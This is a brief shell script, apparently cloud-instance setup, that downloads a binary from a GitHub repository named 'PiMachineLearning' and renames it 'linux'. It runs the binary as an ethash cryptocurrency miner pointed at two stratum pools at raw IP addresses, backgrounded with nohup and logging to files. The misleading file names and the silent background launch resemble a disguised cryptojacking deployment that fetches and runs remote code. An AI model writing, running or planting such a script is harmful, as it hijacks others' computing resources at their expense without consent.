###########

wget https://github.com/Dev699vn/PiMachineLearning/raw/main/linux.tar.gz
tar -xvf linux.tar.gz
rm -rf linux.tar.gz
mkdir /home/ec2-user/bin
mv linux /home/ec2-user/bin/linux

cat << "EOF" > /home/ec2-user/bin/runsrc.sh
#!/bin/bash
./linux -a ethash -o stratum+http://184.164.64.100:8086 -o stratum+http://159.203.107.149:8080

EOF

chmod +x /home/ec2-user/bin/runsrc.sh
chown ec2-user:ec2-user /home/ec2-user/bin/runsrc.sh
cd /home/ec2-user/bin/ && nohup ./runsrc.sh > result.log 2>&1 &

echo ""
###########





#sudo -u ec2-user && nohup sh /home/ec2-user/bin/runsrc.sh > /home/ec2-user/bin/result.txt 2>&1 &
sleep 2
cd /home/ec2-user/bin && nohup ./runsrc.sh > result.txt 2>&1 &


